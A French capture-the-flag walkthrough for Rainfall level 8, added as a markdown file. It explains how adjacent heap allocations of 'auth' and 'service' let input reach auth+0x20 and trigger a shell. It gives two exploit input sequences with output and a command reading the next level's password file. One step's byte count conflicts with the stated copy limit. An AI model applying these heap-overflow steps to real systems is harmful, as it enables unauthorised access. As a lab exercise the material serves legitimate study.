@@ -1,0 +1,121 @@
+# Rainfall Level 8 - Walkthrough Complet
+
+## Objectif
+
+Exploiter une logique d'allocation mémoire pour atteindre la condition suivante :
+
+```c
+if (*(int *)(auth + 0x20) != 0) {
+    system("/bin/sh");
+}
+```
+
+But : Lancer `/bin/sh` et lire `/home/user/level9/.pass`
+
+---
+
+## Analyse du programme
+
+### 1. Fonctionnalités principales
+
+Le binaire expose une boucle qui lit des commandes depuis l'entrée standard. Les commandes reconnues sont :
+
+- `auth [data]` :
+
+  - Alloue 4 octets pour `auth`
+  - Zéro les 4 octets
+  - Copie jusqu'à 30 octets de `data` dans `auth` (si longueur < 0x1f)
+
+- `reset` :
+
+  - `free(auth)`
+
+- `service [data]` :
+
+  - `strdup(data)` dans `service`
+
+- `login` :
+
+  - Si `*(auth + 0x20)` != 0, alors `system("/bin/sh")`
+  - Sinon, affiche "Password:\n"
+
+### 2. Variables Globales
+
+- `auth` et `service` sont deux pointeurs globaux.
+- Ils sont affichés à chaque itération :
+
+```c
+printf("%p, %p\n", auth, service);
+```
+
+---
+
+## Objectif Technique
+
+Nous devons forcer la valeur `*(auth + 0x20)` à être différente de 0. Cela signifie que nous devons :
+
+- Contrôler le contenu de `auth`
+- Écrire à l'offset 0x20 dans `auth` (soit 32 octets)
+
+Or, `auth` est une zone de 4 octets, donc on ne peut *normalement* pas écrire 32 octets.
+
+Mais `service` est alloué juste *après* `auth` dans le heap → en jouant avec `auth` et `service`, on peut déborder.
+
+---
+
+## Exploit en 2 Solutions
+
+### Solution 1 : Chaîne unique avec `auth`
+
+```bash
+$ ./level8
+(nil), (nil)
+auth AAAAAAAAAAAAAAAAAAAAAAAAABCDEFG
+0x804a008, (nil)
+login
+$ whoami
+level9
+$ cat /home/user/level9/.pass
+[flag ici]
+```
+
+Explication :
+
+- `auth` = 0x804a008
+- `auth + 0x20` = 0x804a028
+- En écrivant au moins 32 octets (padding) + 1 valeur != 0, on modifie l'octet cible
+
+### Solution 2 : Deux commandes `service`
+
+```bash
+$ ./level8
+(nil), (nil)
+auth A
+0x804a008, (nil)
+service 0123456789abcdef
+0x804a008, 0x804a018
+service 0123456789abcdef
+0x804a008, 0x804a028
+login
+$ whoami
+level9
+```
+
+Explication :
+
+- Deux allocations successives de 16 octets chacune → 2 \* 16 = 32 octets → le `+0x20` de `auth`
+- Le contenu du `strdup()` écrit une valeur non-nulle à `auth+0x20`
+
+---
+
+## Récapitulatif
+
+| Etape           | Détail                                                              |
+| --------------- | ------------------------------------------------------------------- |
+| auth [input]    | alloue 4 octets, copie jusqu'à 30 caractères                        |
+| service [input] | alloue un buffer dans le heap juste après `auth`                    |
+| login           | vérifie si `*(auth+0x20) != 0` pou lancer `system("/bin/sh")`      |
+| Objectif        | Ecrire une valeur non-nulle à `auth+0x20`                           |
+| Exploit         | Utiliser un overflow ou des allocations consécutives avec `service` |
+
+---
